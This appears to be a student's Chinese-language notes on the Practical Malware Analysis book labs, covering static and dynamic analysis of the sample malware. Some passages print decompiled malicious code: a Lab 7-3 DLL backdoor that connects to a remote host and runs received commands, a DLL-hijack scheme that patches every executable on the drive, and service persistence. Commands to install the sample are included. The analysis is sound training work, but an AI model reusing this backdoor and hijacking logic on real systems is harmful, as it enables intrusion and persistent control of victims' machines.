---
title: Lab
cascade:
  type: docs
---

## 《恶意代码分析实战》的实验

### Lab 1-1

```
----------------
Lab01-01.exe
Lab01-01.dll
----------------

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
实验内容：
1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？
2、这些文件是什么时候编译的？
3、这两个文件中是否存在迹象说明他们是否被加壳或混淆了？如果是，这些迹象在哪里？
4、是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？
5、是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？
6、是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？
7、你猜这些文件的目的是干什么的？
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

1. ![image](/myassets-Lab/1-1 1.png)

   ![image](/myassets-Lab/1-1 2.png)

2. 通过pe工具查看时间戳，发现两个文件的编译时间：

   ![image](/myassets-Lab/1-1 3.png)

   ![image](/myassets-Lab/1-1 4.png)

3. 两个文件都用die查一下壳：

   ![image](/myassets-Lab/1-1 5.png)

   ![image](/myassets-Lab/1-1 6.png)

   发现二者没有壳，但是关于这个dll文件没有导出表：

   ![image](/myassets-Lab/1-1 7.png)

4. 看一下exe文件的导入表，就是这个文件用了哪些系统函数：

   ![image](/myassets-Lab/1-1 8.png)

   这两个API的功能是通常用于枚举指定目录中的文件。

5. 用记事本打开exe文件可以看到可能对`C:\Windows\System32\Kernel32.dll`进行了某些操作：

   ![image](/myassets-Lab/1-1 9.png)

6. 同样用记事本打开dll文件，可以看到一个ip地址：

   ![image](/myassets-Lab/1-1 10.png)

7. 创造一个后门什么的吧🥲

### Lab 1-2

```
----------------
Lab01-02.exe
----------------

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
实验内容：
1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？
2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。
3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？
4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

1. ![image](/myassets-Lab/1-1 11.png)

2. 用die查壳发现是upx壳，在[这个](https://github.com/upx/upx)网址下载upx加壳器后将对应文件放到目录下后输入脱壳指令：

   ```shell
   upx -d Lab01-02.exe
   ```

   额，就好了。

3. ![image](/myassets-Lab/1-1 12.png)

4. 用记事本打开程序：

   ![image](/myassets-Lab/1-1 13.png)

   可以看到一个一个网址，恶意代码可能是想连接到该网址。

### Lab 1-3

```
----------------
Lab01-03.exe
----------------

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
实验内容：
1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？
2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。
3、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？
4、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

1. ![image](/myassets-Lab/1-1 14.png)

2. 将exe文件拖入linxerUnpacker中，单击"壳特征脱壳"，成功脱壳。

3. ![image](/myassets-Lab/1-1 15.png)

4. 用记事本打开程序：

   ![image](/myassets-Lab/1-1 16.png)

   可以看到一个一个网址。

### Lab 1-4

```
----------------
Lab01-04.exe
----------------

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
实验内容：
1、将文件上传到http://www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？
2、是否有这个文件被加壳或混淆的任何迹象？如果是这样，这些迹象是什么？如果该文件被加壳，请进行脱壳。
3、这个文件是什么时候被编译的？
4、有没有任何导入函数能够暗示出这个程序的功能？如果是，是哪些导入函数，他们会告诉你什么？
5、哪些基于主机或基于网络的迹象可以被用来确定这个恶意代码感染的机器？
6、这个文件在资源段中包含一个资源，使用Restorator工具来检查资源，然后抽取资源。从资源中你能发现什么吗？
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

1. ![image](/myassets-Lab/1-1 17.png)

2. 用die查看一下，没有壳吧，但发现一个PE资源，可以使用：

   ![image](/myassets-Lab/1-1 18.png)

   ![image](/myassets-Lab/1-1 22.png)

   全选后转储出来。

3. ![image](/myassets-Lab/1-1 19.png)

4. 在导入表中找到如下函数：

   ![image](/myassets-Lab/1-1 20.png)

   这个api是从网络上下载文件并保存到本地的一个操作。

5. 用记事本打开拿个我们转储的文件，可以看到一个网址，可能是用上面那个api下载了这个程序：

   ![image](/myassets-Lab/1-1 21.png)

6. 好吧，第二步好像已经抽取完资源了，[官方文档](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)。

### Lab 3-1

```
----------------
Lab03-01.exe
----------------

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
实验内容：
1、找出这个恶意代码的导入函数与字符串列表？
2、这个恶意代码在主机上的感染特征是什么？
3、这个恶意代码是否存在一些有用的网络特征码？如果存在，他们是什么？
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

1. 使用die查看导入表，发现只有一个函数：

   ![image](/myassets-Lab/3-1 1.png)

   `ExitProcess`是退出进程相关的api函数，字符串可以找到如下：

   ```
   SOFTWARE\Classes\http\shell\open\commandV
   Software\Microsoft\Active Setup\Installed Components\
   www.practicalmalwareanalysis.com
   SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
   ```

   **SOFTWARE\Classes\http\shell\open\command**

   **用途**：

   - 这个注册表路径定义了系统如何处理 `http` 协议的链接。
   - `command` 子键包含一个字符串值，指定了当用户点击一个 HTTP 链接时要执行的命令。

   **分析**：

   - 浏览器默认应用程序设置：通常，这里会设置为某个浏览器的可执行文件路径，比如 `C:\Program Files (x86)\Google\Chrome\Application\chrome.exe`。
   - 恶意软件可能会修改这个键，以便劫持 HTTP 链接，重定向到恶意网站或执行恶意程序。

   **Software\Microsoft\Active Setup\Installed Components\**

   **用途**：

   - `Active Setup` 用于在用户登录时执行配置任务和更新。
   - `Installed Components` 下的每个子键对应一个已安装的组件，这些组件可以在用户首次登录时执行特定的配置操作。

   **分析**：

   - 系统组件和应用程序可能会在此注册表路径下创建子键，以便在用户登录时执行特定任务。
   - 恶意软件也可能利用这个路径，在用户登录时执行恶意代码。

   **SOFTWARE\Microsoft\Windows\CurrentVersion\Run**

   **用途**：

   - 这个注册表路径包含的子键定义了在用户登录时自动启动的程序。
   - 每个子键的名称是启动项的名称，值是要执行的程序的路径。

   **分析**：

   - 合法的启动项：例如，防病毒软件、驱动程序相关程序、即时通讯软件等。
   - 恶意软件常常在这里添加启动项，以便在用户每次登录时自动运行其恶意代码。

    **SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders**

   **用途**：

   - 这个注册表路径定义了用户外壳文件夹的位置，如桌面、我的文档、收藏夹等。
   - 子键和值对应了系统和用户特定的文件夹路径。

2. 所使用的句柄表：

   ![image](/myassets-Lab/3-1 2.png)

   听说它创建了一个互斥体，但是我运行起来进程就退出了，没有看到有互斥体。（可能是什么反调试？）

   不明白

3. 恶意软件解析了域名`www.practicalmalwareanalysis.com`

### Lab 3-2

```
----------------
Lab03-02.dll
----------------

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
实验内容：
1、你怎么样让这个恶意代码自行安装？
2、在安装之后，你如何让这个恶意代码运行起来？
3、你怎么能找到这个恶意代码是在哪个进程下运行的？
4、你可以在Process Monitor工具中设置什么样的过滤器，才能收集这个恶意代码的信息？
5、这个恶意代码在主机上的感染迹象特征是什么？
6、这个恶意代码是否存在一些有用的网络特征码
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

1. 使用die看一下导出表：

   ![image](/myassets-Lab/3-2 1.png)

   这个dll可能是使用install函数进行安装的，再看一下导入表：

   ![image](/myassets-Lab/3-2 2.png)

   可以看到一些对注册表操作的api和一些关于服务的相关操作，还有关于http的相关操作：

   ![image](/myassets-Lab/3-2 3.png)

   搜索字符串可以看到，有一个叫svchost的exe文件，有可能是shellcode加载器

2. 安装dll指令：

   ```shell
   rundll32.exe Lab03-02.dll,installA
   ```

   使用如下命令启动：

   ```sh
   net start IPRIP
   ```

3. 多次运行安装指令，可以发现有多个名为`svchost.exe`的进程：

   ![image](/myassets-Lab/3-2 5.png)

   而且这些进程的ID号最小的只有一个680的，其他ID的进程则是软件创建的。

4. 因为dll是需要exe加载运行，所以我们设置Process Name为dll名字是无效的,而我们这里的Process Name是`svchost.exe`，但是系统中有很多的svchost.exe导致我们不好定位，这里解决的办法是得到进程的pid

5. 查看软件的字符串：

   ![image](/myassets-Lab/3-2 4.png)

   可以看到对应的解析域名，访问的http

### Lab 3-3

主要的文件操作：

![image](/myassets-Lab/3-3 1.png)

不理解为什么有一堆A，用die查看导入表，可以发现有写进程内存的函数，推测有对应的操作：

![image](/myassets-Lab/3-3 2.png)

### Lab 3-4

运行后有自删除操作。

导入表中导入了WS2_32.dll，可能有与网络交互操作。

分析软件行为时发现调用了cmd.exe，这个指令应该是自我删除吧：

![image](/myassets-Lab/3-3 3.png)

其余的基本操作：

![image](/myassets-Lab/3-3 4.png)

**下面的操作都需要使用ida了**

### Lab 5-1

```
----------------
Lab05-01.dll
----------------

使用工具：
1. IDA Pro

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
1、DllMain的地址是什么？
2、使用Imports窗口并浏览到的gethostbyname，导入函数定位到什么地址？
3、有多少函数调用了gethostbyname？
4、将精力集中在位于0x10001757处的对gethostbyname的调用，你能找出哪个DNS请求将被触发吗？
5、IDA Pro识别了在0x10001656处的子过程中的多少个局部变量？
6、IDA Pro识别了在0x10001656处的子过程中的多少个参数？
7、使用Strings窗口，来在反汇编中定位字符串\cmd.exe /c 。它位于哪？
8、在引用\cmd.exe /c的代码所在的区域发生了什么？
9、在同一的区域，在0x100101C8处，看起来好像是dword_1008E5C4是一个全局变量，它帮助决定走哪条路径。那恶意代码是如何设置dword_1008E5C4的呢？(提示：使用dword_1008E5C4的交叉引用。)
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

1. DllMain的地址：0x1000D02E

2. .idata:100163CC

3. `ctrl+x`找交叉引用：

   ![image](/myassets-Lab/5-1 1.png)

4. 这个名为`[This is RDO]pics.praticalmalwareanalysis.com`将会被调用：

   ![image](/myassets-Lab/5-1 2.png)

5. 如下：

   ```asm
   .text:10001656 ; =============== S U B R O U T I N E =======================================
   .text:10001656
   .text:10001656
   .text:10001656 ; DWORD __stdcall sub_10001656(LPVOID lpThreadParameter)
   .text:10001656 sub_10001656    proc near               ; DATA XREF: DllMain(x,x,x)+C8↓o
   .text:10001656
   .text:10001656 var_675         = byte ptr -675h
   .text:10001656 var_674         = dword ptr -674h
   .text:10001656 hModule         = dword ptr -670h
   .text:10001656 timeout         = timeval ptr -66Ch
   .text:10001656 name            = sockaddr ptr -664h
   .text:10001656 var_654         = word ptr -654h
   .text:10001656 in              = in_addr ptr -650h
   .text:10001656 Str1            = byte ptr -644h
   .text:10001656 var_640         = byte ptr -640h
   .text:10001656 CommandLine     = byte ptr -63Fh
   .text:10001656 Str             = byte ptr -63Dh
   .text:10001656 var_638         = byte ptr -638h
   .text:10001656 var_637         = byte ptr -637h
   .text:10001656 var_544         = byte ptr -544h
   .text:10001656 var_50C         = dword ptr -50Ch
   .text:10001656 var_500         = byte ptr -500h
   .text:10001656 Buf2            = byte ptr -4FCh
   .text:10001656 readfds         = fd_set ptr -4BCh
   .text:10001656 buf             = byte ptr -3B8h
   .text:10001656 var_3B0         = dword ptr -3B0h
   .text:10001656 var_1A4         = dword ptr -1A4h
   .text:10001656 var_194         = dword ptr -194h
   .text:10001656 WSAData         = WSAData ptr -190h
   .text:10001656 lpThreadParameter= dword ptr  4
   ```

6. `DWORD __stdcall sub_10001656(LPVOID lpThreadParameter)`一个参数

7. ```asm
   xdoors_d:10095B34 aCmdExeC        db '\cmd.exe /c ',0     ; DATA XREF: sub_1000FF58+278↑o
   ```

8. 可以看到一系列的linux指令，可能就是模拟Linux shell：

   ![image](/myassets-Lab/5-1 3.png)

9. 获取版本消息：

   ```asm
   .text:10003695 ; =============== S U B R O U T I N E =======================================
   .text:10003695
   .text:10003695 ; Attributes: bp-based frame
   .text:10003695
   .text:10003695 ; BOOL sub_10003695()
   .text:10003695 sub_10003695    proc near               ; CODE XREF: sub_10001656+1D↑p
   .text:10003695                                         ; sub_10003B75+7↓p ...
   .text:10003695
   .text:10003695 VersionInformation= _OSVERSIONINFOA ptr -94h
   .text:10003695
   .text:10003695                 push    ebp
   .text:10003696                 mov     ebp, esp
   .text:10003698                 sub     esp, 94h
   .text:1000369E                 lea     eax, [ebp+VersionInformation]
   .text:100036A4                 mov     [ebp+VersionInformation.dwOSVersionInfoSize], 94h
   .text:100036AE                 push    eax             ; lpVersionInformation
   .text:100036AF                 call    ds:GetVersionExA
   .text:100036B5                 xor     eax, eax
   .text:100036B7                 cmp     [ebp+VersionInformation.dwPlatformId], 2
   .text:100036BE                 setz    al
   .text:100036C1                 leave
   .text:100036C2                 retn
   .text:100036C2 sub_10003695    endp
   ```

   可能会检查程序是否在Windows NT 4.0或更早的时候运行这些版本有不同的平台ID,而不是后期版本的Windows。这个对于那些不设计以更新版本的旧程序来说是有用的窗户。

   

### Lab 6-1

main函数的主要逻辑如下：

```c
int sub_401000()
{
  BOOL ConnectedState; // [esp+0h] [ebp-4h]

  ConnectedState = InternetGetConnectedState(0, 0);
  if ( ConnectedState )
  {
    sub_40105F(aSuccessInterne, ConnectedState);
    return 1;
  }
  else
  {
    sub_40105F(aError11NoInter, 0);
    return 0;
  }
}
```

在0x40105f中，函数逻辑像从某某读取内容的操作。

整个函数逻辑大概为先检查网络是否连接，如果连接，则读取字符串`Success: Internet Connection`并打印；如果无法连接，则读取字符串`Error 1.1: No Internet`并打印



### Lab 6-2

main函数的主要逻辑如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+0h] [ebp-8h]

  if ( !sub_401000() )
    return 0;
  v4 = sub_401040();
  if ( v4 )
  {
    sub_40117F("Success: Parsed command is %c\n", v4);
    Sleep(0xEA60u);
  }
  return 0;
}
```

进行两个if的判断操作。

在0x40117f中，函数逻辑像打印传入的参数。在这个子函数中使用了switch判断操作。

在0x401040中，函数的逻辑像使用if来检查html的连通性，成功则下载`http://www.practicalmalwareanalysis.com/cc.htm`，失败则报错

网络特征为首先是打开`Internet Explorer 7.5/pma`，之后是下载`http://www.practicalmalwareanalysis.com/cc.htm`

首先检查网络连通性，如果连通则下载`http://www.practicalmalwareanalysis.com/cc.htm`，让后输出到屏幕:`Success: Parsed command is （这个文件）`并休眠1分钟；如果不连通则退出。

### Lab 6-3

相比6-2多调用了一个`sub_401130(v4, *argv);`函数。

其中一个参数(v4)是有关下载的htlm中的值，另一个参数(*argv)是终端中执行文件后跟的参数。这个函数里面使用switch进行判断。判断用户输入的参数来执行相应的操作：

```asm
a:创建一个新的目录
CreateDirectoryA与PathName指定的路径。

b:复制文件
使用CopyFileA使用lpexiingfilename指定的源文件名,和数据指定的目标文件名。

c:删除使用文件
DeleteFileA与数据指定的文件路径。

d:打开注册表
键使用RegOpenKeyExA使用子键指定的关键名称,并设置ValueName的值到数据的内容。如果这个操作失败了，则调用sub_401271错误消息。

e:睡眠时间为100秒
使用睡眠。
```

本地的特特征是在注册表中添加键`Software\Microsoft\Windows\CurrentVersion\Run\Malware`也就是添加到开机自启动。

该程序先检查是否存在有效的Internet连接。如果找不到，程序直接终止。否则，改程序会尝试下载一个网页，该网页包含一段以<!--开头的HTML注释。该注释的第一个字符被用于switch语句来决定程序在本地系统运行的下一步行为，包括是否删除一个文件、创建一个目录、设置一个注册表run键、复制一个文件或者休眠100秒。

### Lab 6-4

与6-3相比添加了一个循环的次数，循环1441次6-3的逻辑。一次循环休眠1分钟，则执行完需要24小时，并且User-Agent中添加了运行时间的分钟数。

### Lab 7-1

程序首先定义了一个名为`MalService`的服务：

```c
ServiceStartTable.lpServiceName = aMalservice;
```

之后程序尝试获取一个名为`HGL345`的互斥体，如果存在则退出：

```c
 if ( OpenMutexA(0x1F0001u, 0, Name) )
    ExitProcess(0);
```

如果不存在，则创建一个互斥体：

```c
CreateMutexA(0, 0, Name);
```

之后打开SCM（系统控制管理器）：

```c
SCM = OpenSCManagerA(0, 0, 3u);
```

获取当前进程的handle：

```c
GetCurrentProcess()
```

获取当前模块名，并且创建一个名为`Malservice`的服务，`CreateServiceA`这个函数的第四个参数为二则代表SERVICE_AUTO_START：

```c
GetModuleFileNameA(0, Filename, 0x3E8u);
CreateServiceA(SCM, DisplayName, DisplayName, 2u, 0x10u, 2u, 0, Filename, 0, 0, 0, 0, 0);
```

之后清空系统时间结构体中月的成员，并设置年为2100年，之后设置了一个Timer来等待这个时间：

```c
memset(&SystemTime.wMonth, 0, 14);
SystemTime.wYear = 2100;
SystemTimeToFileTime(&SystemTime, &FileTime);
WaitableTimerA = CreateWaitableTimerA(0, 0, 0);
SetWaitableTimer(WaitableTimerA, &FileTime, 0, 0, 0, 0);
```

如果时间没到，则睡觉（时间很长,如果这个睡觉时间结束，但是等待的时间还没有到，程序似乎就直接退出了，因为这个0xFFFFFFFF才2.05天），如果时间到了则创建20个线程，这20个线程一直循环访问网站`http://www.malwareanalysisbook.com`：

```c
if ( !WaitForSingleObject(WaitableTimerA, 0xFFFFFFFF) )
  {
    v2 = 20;
    do
    {
      CreateThread(0, 0, StartAddress, 0, 0, 0);
      --v2;
    }
    while ( v2 );
  }
  Sleep(0xFFFFFFFF);

void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)
{
  void *i; // esi

  for ( i = InternetOpenA(szAgent, 1u, 0, 0, 0); ; InternetOpenUrlA(i, szUrl, 0, 0, 0x80000000, 0) )
    ;
}
```

### Lab 7-2

所有代码如下，显而易见没有持久化，不退出等操作：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  OLECHAR *v3; // esi
  LPVOID ppv; // [esp+0h] [ebp-24h] BYREF
  VARIANTARG pvarg; // [esp+4h] [ebp-20h] BYREF
  __int16 v7[4]; // [esp+14h] [ebp-10h] BYREF
  int v8; // [esp+1Ch] [ebp-8h]

  if ( OleInitialize(0) >= 0 )
  {
    CoCreateInstance(&rclsid, 0, 4u, &riid, &ppv);
    if ( ppv )
    {
      VariantInit(&pvarg);
      v7[0] = 3;
      v8 = 1;
      v3 = SysAllocString(psz);
      (*(*ppv + 0x2C))(ppv, v3, v7, &pvarg, &pvarg, &pvarg);
      SysFreeString(v3);
    }
    OleUninitialize();
  }
  return 0;
}
```

这个`COM`组件有一个规定就是，如果程序想要使用COM组件那么在程序开头必须调用一个或以上的`OleInitialize`或者`CoInitializeEx`让`COM`初始化，而`CoCreateInstance`为创建一个`COM`组件，其中`rclsid`为`Internet Explorer`，`riid`为`IWebBrowser2`。或许是无法识别的原因，这个`*ppv + 0x2C`，也就是`[edx+2Ch]`这个地址其实是`Navigate`函数，这个函数就可以使程序启动`Internet Explorer`，第二个参数（v3）就是弹出浏览器的地址（`http://www.malwareanalysisbook.com/ad.html`）。

### Lab 7-3

DLL：

```c
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  SOCKET v3; // esi
  HANDLE hObject; // [esp+10h] [ebp-11F8h]
  struct sockaddr name; // [esp+14h] [ebp-11F4h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+24h] [ebp-11E4h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+34h] [ebp-11D4h] BYREF
  struct WSAData WSAData; // [esp+78h] [ebp-1190h] BYREF
  char buf[4093]; // [esp+208h] [ebp-1000h] BYREF
  __int16 v11; // [esp+1205h] [ebp-3h]
  char v12; // [esp+1207h] [ebp-1h]

  if ( fdwReason == 1 )
  {
    buf[0] = byte_10026054;
    memset(&buf[1], 0, 0xFFCu);		//初始化
    v11 = 0;
    v12 = 0;
    if ( !OpenMutexA(0x1F0001u, 0, Name) )	//打开互斥体，如果没有就创建一个
    {
      CreateMutexA(0, 0, Name);
      if ( !WSAStartup(0x202u, &WSAData) )	//初始化winsock库
      {
        v3 = socket(2, 1, 6);	//创建tcp通信
        if ( v3 != -1 )
        {
          name.sa_family = 2;
          *&name.sa_data[2] = inet_addr(cp);
          *name.sa_data = htons(0x50u);
          if ( connect(v3, &name, 16) != -1 )
          {
            while ( 1 )
            {
              while ( 1 )
              {
                do
                {
                  if ( send(v3, ::buf, strlen(::buf), 0) == -1 || shutdown(v3, 1) == -1 )	//这个send发送了hello
                    goto LABEL_15;
                }
                while ( recv(v3, buf, 4096, 0) <= 0 );	//如果接收到sleep就睡觉60秒，如果接收到exec就接收第五个之后的值进行启动进程。
                if ( strncmp(expect_sleep, buf, 5u) )
                  break;
LABEL_10:
                Sleep(0x60000u);
              }
              if ( strncmp(expect_exec, buf, 4u) )
              {
                if ( buf[0] == 'q' )
                {
                  CloseHandle(hObject);
                  break;
                }
                goto LABEL_10;
              }
              memset(&StartupInfo, 0, sizeof(StartupInfo));
              StartupInfo.cb = 68;
              CreateProcessA(0, &buf[5], 0, 0, 1, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation);
            }
          }
LABEL_15:
          closesocket(v3);
        }
        WSACleanup();
      }
    }
  }
  return 1;
}
```

EXE：

大致流程为

1. 程序在system32目录下创建kerne132.dll文件
2. 创建Lab07-03.dll文件在当前目录下，通过一系列操作，将Lab07-03.dll文件写入特定内容，可以使kerne132.dll的导出表与kernel32.dll的导出表相同，并且当调用kerne132.dll中的api时转发到kernel32.dll中调用函数
3. 将Lab07-03.dll复制到system32目录下的kerne132.dll文件中
4. 遍历C目录下的所有.exe文件，将其中的kernel32.dll改为kerne132.dll



